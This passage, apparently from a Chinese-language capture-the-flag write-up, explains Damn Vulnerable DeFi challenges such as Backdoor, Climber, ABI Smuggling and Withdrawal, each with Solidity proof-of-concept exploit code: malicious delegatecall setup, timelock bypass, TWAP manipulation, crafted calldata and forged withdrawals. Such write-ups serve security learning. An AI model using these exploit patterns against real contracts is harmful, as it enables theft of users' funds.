- 在 initializer 最後在 deployProxy 執行,且是我們可以控制的, call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0). 所以我們可以在initializer中執行 Safe.setup, 然後控制第三個欄位 to, Contract address for optional delegate call. 指定一個任意合約或有後門的合約. 最後在第4個欄位data 可以執行 Data payload for optional delegate call.搭配以上流程就可以拿到每一個受益人的ETH.
```
    function setup(
        address[] calldata _owners, //List of Safe owners.
        uint256 _threshold, //Number of required confirmations for a Safe transaction.
        address to, //   Contract address for optional delegate call.
        bytes calldata data, //Data payload for optional delegate call.
        address fallbackHandler
    ) 
```

[POC](./damn-vulnerable-defi/test/backdoor/Backdoor.t.sol) :
```
    function test_backdoor() public checkSolvedByPlayer {
             Exploit exploit = new Exploit(address(singletonCopy),address(walletFactory),address(walletRegistry),address(token),recovery);
             exploit.attack(users);
    }
contract Exploit {
    address private immutable singletonCopy;
    address private immutable walletFactory;
    address private immutable walletRegistry;
    DamnValuableToken private immutable dvt;
    address recovery;

    constructor(
        address _masterCopy,
        address _walletFactory,
        address _registry,
        address _token,
        address _recovery
    ) {
        singletonCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _registry;
        dvt = DamnValuableToken(_token);
        recovery = _recovery;
    }

    function delegateApprove(address _spender) external {
        dvt.approve(_spender, 10 ether);
    }

    function attack(address[] memory _beneficiaries) external {
        // For every registered user we'll create a wallet
        for (uint256 i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            // Create the data that will be passed to the proxyCreated function on WalletRegistry
            // The parameters correspond to the GnosisSafe::setup() contract
            bytes memory _initializer = abi.encodeWithSelector(
                Safe.setup.selector, // Selector for the setup() function call
                beneficiary, // _owners =>  List of Safe owners.
                1, // _threshold =>  Number of required confirmations for a Safe transaction.
                address(this), //  to => Contract address for optional delegate call.
                abi.encodeWithSignature("delegateApprove(address)", address(this)), // data =>  Data payload for optional delegate call.
                address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
                0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
                0, // payment => Value that should be paid
                0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
            );

            // Create new proxies on behalf of other users
        SafeProxy _newProxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
         singletonCopy,  // _singleton => Address of singleton contract.
         _initializer,   // initializer => Payload for message call sent to new proxy contract.
         i,              // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
         IProxyCreationCallback(walletRegistry)  // callback => Cast walletRegistry to IProxyCreationCallback
);
            //Transfer to caller
            dvt.transferFrom(address(_newProxy), recovery, 10 ether);
        }
    }
}
```

### 12. Climber

[題目](https://www.damnvulnerabledefi.xyz/challenges/climber/): 有一個安全金庫合約，裡面保管了1000萬個DVT代幣。該金庫是可升級的，並且遵循UUPS模式。金庫的所有者是一個timelock合約。該合約每15天可以提取有限數量的代幣。在金庫上還有一個額外的角色，擁有在緊急情況下清空所有代幣的權限。在timelock合約上，只有擁有「提議者」角色的帳戶才能安排在1小時後執行的操作。你必須從金庫中救出所有代幣並將其存入指定的恢復帳戶。

過關條件:
- 搶救金庫資產
- 所有代幣都被轉移到 recovery 錢包

知識點:
- Timelock 機制


解題:
- 在正常情況下, schedule 應該先被調用, 隨後等待時間延遲（TimeLock），並最終透過 execute 執行這些操作, 但是在 execute() 存在一個邏輯漏洞在於執行順序的不當：操作應在檢查通過後執行，而不是執行後再檢查。這使得惡意操作能夠繞過檢查，並直接對合約的狀態進行更改。正確的修復方式是將 getOperationState(id) 檢查移到操作執行之前，從而確保只有合法且已規劃的操作才能執行。
- 利用這個bug, 我就可以把想要執行的payload放在array 前幾筆, 最後一筆只要執行schedule 更新狀態就好
```
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
    external
    payable
{
...

    bytes32 id = getOperationId(targets, values, dataElements, salt);

    for (uint8 i = 0; i < targets.length;) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
        unchecked {
            ++i;
        }
    }

    //vulnerable logic
    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;
}
```
![Screenshot_2024-09-05_at_9_27_53 AM](https://hackmd.io/_uploads/SJKtctLnA.png)



- 過關流程: grantRole 拿到 PROPOSER_ROLE -> updateDelay to 0 -> transferOwnership -> timelockSchedule -> upgrade contract -> withdraw -> done

[POC](./damn-vulnerable-defi/test/climber/Climber.t.sol) :

```
    function test_climber() public checkSolvedByPlayer {

            Exploit exploit = new Exploit(payable(timelock),address(vault));
            exploit.timelockExecute();
            PawnedClimberVault newVaultImpl = new PawnedClimberVault();
            vault.upgradeToAndCall(address(newVaultImpl),"");
            PawnedClimberVault(address(vault)).withdrawAll(address(token),recovery);  
    }
contract Exploit {
    address payable private immutable timelock;

    uint256[] private _values = [0, 0, 0,0];
    address[] private _targets = new address[](4);
    bytes[] private _elements = new bytes[](4);

    constructor(address payable _timelock, address _vault) {
        timelock = _timelock;
        _targets = [_timelock, _timelock, _vault, address(this)];

        _elements[0] = (
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
        );
        _elements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        _elements[2] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
        _elements[3] = abi.encodeWithSignature("timelockSchedule()");
    }

    function timelockExecute() external {
        ClimberTimelock(timelock).execute(_targets, _values, _elements, bytes32("123"));
    }

    function timelockSchedule() external {
        ClimberTimelock(timelock).schedule(_targets, _values, _elements, bytes32("123"));
    }
}


contract PawnedClimberVault is ClimberVault {
/// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
    function withdrawAll(address tokenAddress, address receiver) external onlyOwner {
        // withdraw the whole token balance from the contract
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(receiver, token.balanceOf(address(this))), "Transfer failed");
    }
}
```

### 13. Wallet Mining

[題目](https://www.damnvulnerabledefi.xyz/challenges/wallet-mining/): 激勵用戶部署 Safe 錢包，並獎勵他們 1 DVT。它集成了一個可升級的授權機制，只允許特定的部署者（也就是所謂的守衛者）為特定部署獲得報酬。這個部署者合約只能與在部署過程中設置的 Safe 工廠和 copy 一起工作。看起來 Safe 單例工廠已經部署了。團隊將 2000 萬個 DVT 代幣轉移到地址 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b 的用戶，她的簡單 1-of-1 Safe 原本應該在那裡部署。但他們遺失了應用於部署的 nonce。更糟的是，系統中有漏洞的傳聞正在流傳。團隊非常驚慌。沒有人知道該怎麼做，讓這位用戶更加不知所措。她已授權你訪問她的私鑰。你必須在為時已晚之前，拯救所有資金！從錢包部署者合約中回收所有代幣，並將它們發送到對應的守衛者地址。同時保護並返還用戶的所有資金。在一筆交易中完成。


過關條件:
- Factory 合約必須有程式碼
- 確保在 walletDeployer.cpy() 返回的 Safe copy地址中有程式碼存在
- USER_DEPOSIT_ADDRESS 這個存款地址中有程式碼存在
- 存款地址和錢包部署合約中不得持有代幣
- 確認用戶 (user) 的 nonce 值仍為 0，表示用戶沒有執行過任何交易
- 只能執行一次交易
- 用戶 (user) 錢包中持有的代幣數量為 DEPOSIT_TOKEN_AMOUNT
- 確認守衛者 (ward) 帳戶中的代幣餘額為初始 walletDeployer 合約的代幣餘額，表示玩家已經將應支付的款項轉移給了守衛者

知識點:
- Create vs Create2
- Eip1155 vs replay
- Safe wallet 知識 
    - Safe.setup(): initial storage of the Safe contract
    - SafeProxy.creationCode: creation code used for the Proxy deployment. With this it is easily possible to calculate predicted address.
    - SafeProxyFactory:  - Allows to create a new proxy contract and execute a message call to the new proxy within one transaction.
    - Foundry computeCreate2Address & [computeCreateAddress](https://book.getfoundry.sh/reference/forge-std/compute-create-address#computecreateaddress) 預算地址
- Proxy 合約 Storage collision

[REF: OP hacked](https://mirror.xyz/0xbuidlerdao.eth/lOE5VN-BHI0olGOXe27F0auviIuoSlnou_9t3XRJseY)

解題:
- 透過 computeCreate2Address 預算 USER_DEPOSIT_ADDRESS 得到 nonce 為13, 再透過題目 walletDeployer.drop() 透過 createProxyWithNonce 建立 User's safe wallet
- AuthorizerUpgradeable 佔用 slot0 needsInit, 存在 Storage collision. 我們可以初始化用戶錢包將守衛者 (ward) 改為自己, 收到1ETH.

[POC](./damn-vulnerable-defi/test/wallet-mining/WalletMining.t.sol) :
 
```
    // Find the correct nonce using computeCreate2Address                      
                address target = vm.computeCreate2Address(
                keccak256(abi.encodePacked(keccak256(initializer), nonce)),
                keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))), //initCodeHash
                address(proxyFactory)
            );
    // 另一種寫法  Find the correct nonce using manual CREATE2 address   
         // Calculate the salt (combining the initializer hash and nonce)
            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));

            // Calculate the creation code hash (SafeProxy creation bytecode)
            bytes32 creationCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy)))));

            // Manually compute the CREATE2 address
            address target = address(uint160(uint256(keccak256(
                abi.encodePacked(
                    hex"ff",                    // Constant value
                    address(proxyFactory),      // Deployer address (proxyFactory)
                    salt,                       // Salt value
                    creationCodeHash            // Keccak256 of creation code
                )
            ))));
```
 
 
 
### 14. Puppet V3

[題目](https://www.damnvulnerabledefi.xyz/challenges/climber/): 無論是熊市還是牛市，真正的 DeFi 開發者都會持續建設。還記得你之前幫助過的那個借貸池嗎？他們現在推出了新版本。他們現在使用 Uniswap V3 作為預言機。沒錯，不再使用現貨價格！這次借貸池查詢的是資產的時間加權平均價格，並且使用了所有推薦的庫。Uniswap 市場中有 100 WETH 和 100 DVT 的流動性。借貸池裡有一百萬個 DVT 代幣。你從 1 ETH 和一些 DVT 開始，必須拯救所有人於這個存在漏洞的借貸池。別忘了將它們發送到指定的恢復帳戶。注意：此挑戰需要有效的 RPC URL，以便將主網狀態分叉到你的本地環境。

過關條件:
- 必須在 block.timestamp - initialBlockTimestamp < 115 秒內完成
- 借貸池（lendingPool）中的代幣餘額必須為零
- 所有LENDING_POOL_INITIAL_TOKEN_BALANCE代幣都被轉移到 recovery 錢包

知識點:
- Uniswap TWAP 時間加權平均價格預言機

解題:
- 要注意 calculateDepositOfWETHRequired 拿到的報價會是3倍價格.

```
    function calculateDepositOfWETHRequired(uint256 amount) public view returns (uint256) {
        uint256 quote = _getOracleQuote(_toUint128(amount));
        return quote * DEPOSIT_FACTOR;
    }
```
- Pool 裡有 100 個 WETH 和 100 個 DVT 代幣，流動性較小,PuppetV3Pool.sol合約使用了10分鐘的TWAP期來計算DVT代幣的價格, 這個設定使合約容易受到價格操控攻擊的影響, 無需付出太多成本! 有了這個方法後, 我們可以透過我們擁有的 110 DVT 代幣換成 WETH, 使 DVT 代幣變得超級便宜. 因為oracle會根據過去10分鐘的價格數據來計算當前價格。然而，由於TWAP期較短，只需在這10分鐘內大幅度操作交易（如大筆兌換DVT），即可顯著影響報價. 由於TWAP是一種延遲報價機制，在操控價格後，有一個短暫的時間窗口（例如110秒）讓攻擊者利用降低的價格進行不公平的借貸。這個時間窗口允許攻擊者在TWAP價格尚未恢復到正常水平之前，最大化利用這個價格差距來實現獲利.

[POC](./damn-vulnerable-defi/test/puppet-v3/PuppetV3.t.sol) :

```
    function test_puppetV3() public checkSolvedByPlayer {
       address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
        token.approve(address(uniswapRouterAddress), type(uint256).max);
uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
console.log("beofre quote: ", quote1); //quote:3000000000000000000000000

 
        ISwapRouter(uniswapRouterAddress).exactInputSingle(
            ISwapRouter.ExactInputSingleParams(
                address(token),
                address(weth),
                3000,
                address(player),
                block.timestamp,
                PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS
                0,
                0
            )
        );  
         vm.warp(block.timestamp + 114);
        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), quote);
        console.log("quote: ", quote);
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }
```


### 15. ABI Smuggling

[題目](https://www.damnvulnerabledefi.xyz/challenges/climber/): 這裡有一個權限金庫，裡面存有 100 萬個 DVT 代幣。該金庫允許定期提取資金，也允許在緊急情況下提取所有資金。合約內嵌了一個通用授權方案，只允許已知帳戶執行特定操作。開發團隊已收到負責任的披露，稱所有資金可能被盜取。請從金庫中救出所有資金，並將其轉移到指定的回收帳戶。

過關條件:
- Vault 餘額為0
- 所有VAULT_TOKEN_BALANCE代幣都被轉移到 recovery 錢包

知識點:
- EVM Calldata 組成

解題:
- 在 AuthorizedExecutor.execute() 使用 calldataload 從傳入的 actionData 從calldataOffset位置（100 bytes）開始提取 4 個字節的函數選擇器然後使用 getActionId 查這個 ID 是否被授權.
- deployer 可以執行- sweepFunds 0x85fb709d
player 可以執行- withdraw 0xd9caed12
- 關鍵在下方只要繞過 getActionId檢查, 就可以任意執行 functionCall 了
```
        if (!permissions[getActionId(selector, msg.sender, target)]) {
            revert NotAllowed();
        }

 
        return target.functionCall(actionData);
```
- 準備 payload. 在 execute() 函數的 ABI 編碼中，actionData 是一個動態大小的 bytes 參數。
0x80 是一個偏移量，它指向 actionData 實際數據開始的位置。這個偏移量是相對於整個 calldata 的起始位置來計算的。所以在這邊是0x80

```
// execute selector
0x1cff79cd
// vault.address （第一個 32 字節）
0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
// offset -> 這個偏移量指向 actionData 在 calldata 中的起始位置。0x80 是 128 字節 （第二個 32 字節）
0000000000000000000000000000000000000000000000000000000000000080
// 這個部分沒有實際用途，通常用來填充固定長度的位置 （第三個 32 字節）
0000000000000000000000000000000000000000000000000000000000000000
// withdraw() 繞過檢查 （第四個 32 字節）
**d9caed12**00000000000000000000000000000000000000000000000000000000
// 這表示 actionData 的總長度是 68 字節（0x44 為十六進制的 68） actionData ( 4 + 32 + 32)
0000000000000000000000000000000000000000000000000000000000000044
// sweepFunds calldata
85fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b
```

[POC](./damn-vulnerable-defi/test/abi-smuggling/ABISmuggling.t.sol) :
```
    function test_abiSmuggling() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(address(vault),address(token),recovery);
        bytes memory payload = exploit.executeExploit();
        address(vault).call(payload);
    }

contract Exploit {
    SelfAuthorizedVault public vault;
    IERC20 public token;
    address public player;
    address public recovery;

    // Event declarations for logging
    event LogExecuteSelector(bytes executeSelector);
    event LogTargetAddress(bytes target);
    event LogDataOffset(bytes dataOffset);
    event LogEmptyData(bytes emptyData);
    event LogWithdrawSelectorPadded(bytes withdrawSelectorPadded);
    event LogActionDataLength(uint actionDataLength);
    event LogSweepFundsCalldata(bytes sweepFundsCalldata);
    event LogCalldataPayload(bytes calldataPayload);

    constructor(address _vault, address _token, address _recovery) {
        vault = SelfAuthorizedVault(_vault);
        token = IERC20(_token);
        recovery = _recovery;
        player = msg.sender;
    }

    function executeExploit() external returns (bytes memory) {
        require(msg.sender == player, "Only player can execute exploit");

        // `execute()` function selector
        bytes4 executeSelector = vault.execute.selector;

        // Construct the target contract address, which is the vault address, padded to 32 bytes
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));

        // Construct the calldata start location offset
        bytes memory dataOffset = abi.encodePacked(uint256(0x80)); // Offset for the start of the action data

        // Construct the empty data filler (32 bytes of zeros)
        bytes memory emptyData = abi.encodePacked(uint256(0));

        // Manually define the `withdraw()` function selector as `d9caed12` followed by zeros
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),     // Withdraw function selector
            bytes28(0)              // 28 zero bytes to fill the 32-byte slot
        );

        // Construct the calldata for the `sweepFunds()` function
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );

        // Manually set actionDataLength to 0x44 (68 bytes)
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        emit LogActionDataLength(actionDataLengthValue);
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));


        // Combine all parts to create the complete calldata payload
        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,              // 4 bytes
            target,                       // 32 bytes
            dataOffset,                   // 32 bytes
            emptyData,                    // 32 bytes
            withdrawSelectorPadded,       // 32 bytes (starts at the 100th byte)
            actionDataLength,             // Length of actionData
            sweepFundsCalldata            // The actual calldata to `sweepFunds()`
        );

        // Emit the calldata payload for debugging
        emit LogCalldataPayload(calldataPayload);

        // Return the constructed calldata payload
        return calldataPayload;
    }
}
```

```
REF
ABI encoding of dynamic types (bytes, strings)
In the ABI Standard, dynamic types are encoded the following way:

The offset of the dynamic data
The length of the dynamic data
The actual value of the dynamic data.
Memory loc      Data
0x00            0000000000000000000000000000000000000000000000000000000000000020 // The offset of the data (32 in decimal)
0x20            000000000000000000000000000000000000000000000000000000000000000d // The length of the data in bytes (13 in decimal)
0x40            48656c6c6f2c20776f726c642100000000000000000000000000000000000000 // actual value
If you hex decode 48656c6c6f2c20776f726c6421 you will get "Hello, world!".
```

### 16. Shards

[題目](https://www.damnvulnerabledefi.xyz/challenges/shards/): Shards NFT 市場是一個無需許可的智能合約，允許 Damn Valuable NFT 的持有者以任何價格（以 USDC 表示）出售這些 NFT。這些 NFT 可能非常有價值，以至於賣家可以將它們拆分成較小的份額（稱為 “shards”）。買家可以購買這些 shards，這些份額以 ERC1155 代幣形式表示。只有當整個 NFT 售出後，市場才會向賣家付款。市場向賣家收取 1% 的手續費，並以 Damn Valuable Tokens (DVT) 支付。這些 DVT 可以存放在安全的鏈上金庫中，而該金庫與 DVT 的質押系統整合。有人正在出售一個 NFT，價格高達……哇，一百萬 USDC？在那些瘋狂的玩家發現之前，你最好先深入研究這個市場。你一開始沒有任何 DVT，請儘量在一次交易中救回資金，並將資產存入指定的回收帳戶。

過關條件:
- Staking 合約中的代幣餘額沒有改變
- marketplace 中消失的代幣（missingTokens）大於 initialTokensInMarketplace 的 0.01%
- 所有追回的資金必須被轉移到 recovery 錢包
- 必須只執行了一次交易

知識點:
- mulDivDown 向下捨去後為 0

解題:
- 題目預設有1個正在賣的NFT. 但 player 並沒有 dvt token 那要怎麼玩下去?
- 檢查fill()的時候, 發現 want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards) 購買者購買的碎片數量是 want，但是該函數中的計算公式可能存在浮點數下溢或計算錯誤的情況，特別是 mulDivDown 和 _toDVT 的結合使用. 但這裡的算法會導致當 want 的數值較小時，最終計算結果可能為 0。這應該就是這題的考點. 所以我們可以支付 0 DVT 代幣即可獲得大量的 NFT 碎片. 計算後want最大值可以是133都會是0元購買.
- 透過0元買到的 NFT 碎片, 可以透過cancel() 把碎片還給Marketplace, 這時候就可以拿到DVT代幣了.
- POC 我執行了10001次, 在local run沒有fail. 如果再private fork環境fail的話再修改算法就好了.

```
    function fill(uint64 offerId, uint256 want) external returns (uint256 purchaseIndex) {

        paymentToken.transferFrom(
            msg.sender, address(this), want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
        );
        if (offer.stock == 0) _closeOffer(offerId);
    }
    function _toDVT(uint256 _value, uint256 _rate) private pure returns (uint256) {
        return _value.mulDivDown(_rate, 1e6);
    }

```


[POC](./damn-vulnerable-defi/test/shards/Shards.t.sol) :

```
 
    function test_shards() public checkSolvedByPlayer {

        Exploit exploit = new Exploit(marketplace,token,recovery);
        exploit.attack(1);
        console.log("recovery balance",token.balanceOf(address(recovery)));
        
    }
contract Exploit {
    ShardsNFTMarketplace public marketplace;
    DamnValuableToken public token;
    address recovery;

    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
        marketplace = _marketplace;
        token = _token;
        recovery = _recovery;
    }

    function attack(uint64 offerId) external {
        uint256 wantShards = 100; // Fill 100 shards per call

        // Loop 10 times to execute fill(1, 100)
        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(offerId, wantShards);
            marketplace.cancel(1,i);
        }

        token.transfer(recovery,token.balanceOf(address(this)));
    }
}
```

### 17. Curvy Puppet

[題目](https://www.damnvulnerabledefi.xyz/challenges/curvy-puppet/): 這裡有一個借貸合約，任何人都可以從 Curve 的 stETH/ETH 池中借出 LP 代幣。為了這麼做，借款人必須首先存入足夠的 Damn Valuable 代幣 (DVT) 作為抵押。如果借款頭寸的價值超過了抵押品的價值，任何人都可以透過償還債務並奪取所有抵押品來清算它。該借貸合約整合了 Permit2 來安全管理代幣授權。它還使用了一個受限的價格預言機來獲取 ETH 和 DVT 的當前價格。Alice、Bob 和 Charlie 都在借貸合約中開立了頭寸。為了格外安全，他們決定將頭寸大幅過度抵押。但他們真的安全嗎？這不是開發者收到的緊急漏洞報告中所聲稱的。在使用者資金被奪走之前，關閉所有頭寸並取回所有可用的抵押品。

開發者已經提供了部分庫存資金以備你在操作中需要使用：200 WETH 和略超過 6 個 LP 代幣。不用擔心利潤，但不要耗盡他們的資金。另外，請確保將任何救回的資產轉移到庫存賬戶。
注意：此挑戰需要一個有效的 RPC URL，以將主網狀態分叉到你的本地環境。

過關條件:
- 所有用戶的部位都被清算
- Treasury 仍有 LP token
- Treasury 仍有 7500 DVT
- Player DVT, stETH, LP 餘額為0

知識點:
- read only reentrancy

解題:
- 看到 Curve 馬上想到經典 read only reentrancy. 但事實上沒這麼簡單, 因為題目只給了 200 ETH, 6.5 LP 很難造成操控 Mainnet 上的池子的價格.
- 卡了2個晚上, 測試了好幾的方法都失敗. 一直無法控制到清算值. 清算時要滿足 if (collateralValue >= borrowValue) revert HealthyPosition(borrowValue, collateralValue);
- 最後透過了兩個 flashloan 來過關. 
- 主要是 Balancer 在借 weth 時不用費用. 這樣我們就可以計算出可以滿足清算而且還有足夠的錢可以還 flashloan.
    
### 18. Withdrawal

[題目](https://www.damnvulnerabledefi.xyz/challenges/withdrawal/): 
有一個代幣橋用來將 Damn Valuable Tokens (DVT) 從 L2 提領到 L1，該橋上有一百萬 DVT 代幣的餘額。L1 端的代幣橋允許任何人在延遲期過後，並且提供有效的默克爾證明時，完成提領。該證明必須與代幣橋所有者設定的最新提領根對應。你收到了一個包含 4 筆在 L2 發起的提領的事件日誌的 JSON 檔案。這些提領可以在 7 天延遲期過後執行。但其中有一筆可疑的提領，不是嗎？你可能需要仔細檢查，因為所有資金可能都處於風險之中。幸運的是，你是一名具有特殊權限的橋樑操作員。透過完成所有給定的提領，防止可疑的那一筆執行，並且確保不會耗盡所有資金來保護這座橋樑。

過關條件:
- L1 Token Bridge 保留大部分的代幣至少是 99%
- Player 地址的代幣餘額必須為 0
- L1 Gateway 的 counter() 值必須大於或等於 WITHDRAWALS_AMOUNT，表示足夠多的提領已完成。
- 以下四個提領的 ID 必須都已被標記為完成：
hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"（第一筆提領）
hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"（第二筆提領）
hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"（第三筆提領）
hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"（第四筆提領）

知識點:
-  跨鏈交易 L2 -> L1
    -  L2Handler.sendMessage：在 L2 上，L2Handler 發送跨鏈訊息
    -  L1Forwarder.forwardMessage：在 L1 上，L1Forwarder 轉發訊息
    -  L1Gateway.finalizeWithdrawal：L1Gateway 確認提領，完成跨鏈操作
    -  TokenBridge.executeTokenWithdrawal：TokenBridge 執行代幣轉移，將代幣發送給接收者。
-  Calldata decode

解題:
- 題目給了 withdrawals.json, 裡面是 MessageStored L2 打到L1的4筆log.
MessageStored的 event signature 是 0x43738d03
透過 keccak256("MessageStored(bytes32,uint256,address,address,uint256,bytes)") 前4bytes得到的.
- 再來要decode一下data. 看看裡面有什麼操作

```
eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba // id
0000000000000000000000000000000000000000000000000000000066729b63 // timestamp
0000000000000000000000000000000000000000000000000000000000000060 // data.offset
0000000000000000000000000000000000000000000000000000000000000104 // data.length
01210a38                                                         // L1Forwarder.forwardMessage.selector
0000000000000000000000000000000000000000000000000000000000000000 // L2Handler.nonce
000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // l2Sender
0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50 // target (l1TokenBridge)
0000000000000000000000000000000000000000000000000000000000000080 // message.offset
0000000000000000000000000000000000000000000000000000000000000044 // message.length
81191e51                                                         // TokenBridge.executeTokenWithdrawal.selector
000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // receiver
0000000000000000000000000000000000000000000000008ac7230489e80000 // amount (10e18)
0000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000
```
- L1Gateway.finalizeWithdrawal 如果是 Operator 不檢查 MerkleProof. 而且 player 有 Operator role. 這邊就可以偽造請求. 來把 token bridge的代幣提走, 我們可以先搶救  900000. 
- 過關條件還要把withdrawals.json裡面的4筆交易狀態需要是finalized, 所以要把這4筆透過 L1Gateway.finalizeWithdrawal 發送一次. 因為我們先搶救了 900000 儘管4筆請求的第3筆轉移資產 999000 會造成轉帳失敗, 但是這個沒有在狀態檢查內, 導致整的交易不會被revert.
![Screenshot 2024-09-06 at 3.35.56 PM](https://hackmd.io/_uploads/H1Oy-NO3A.png)
 
- 最後再把救援的token,還給tokenBridge.

[POC](./damn-vulnerable-defi/test/withdrawal/Withdrawal.t.sol) :

```
    function test_withdrawal() public checkSolvedByPlayer {

        // fake withdrawal operation and obtain tokens
        bytes memory message = abi.encodeCall(
            L1Forwarder.forwardMessage,
            (
                0, // nonce
                address(0), //  
                address(l1TokenBridge), // target
                abi.encodeCall( // message
                    TokenBridge.executeTokenWithdrawal,
                    (
                        player, // deployer receiver
                        900_000e18 //rescue 900_000e18
                    )
                )
            )
        );

        l1Gateway.finalizeWithdrawal(
            0, // nonce
            l2Handler, // pretend l2Handler 
            address(l1Forwarder), // target is l1Forwarder
            block.timestamp - 7 days, // to pass 7 days waiting peroid
            message, 
            new bytes32[](0)   
        );

        // Perform finalizedWithdrawals due to we are operator, don't need to provide merkleproof.
        
        vm.warp(1718786915 + 8 days);
        // first finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            0, // nonce 0
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718786915, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );

        // second finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            1, // nonce 1
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718786965, // timestamp
            hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );

        // third finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            2, // nonce 2
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718787050, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );

        // fourth finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            3, // nonce 3
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718787127, // timestamp
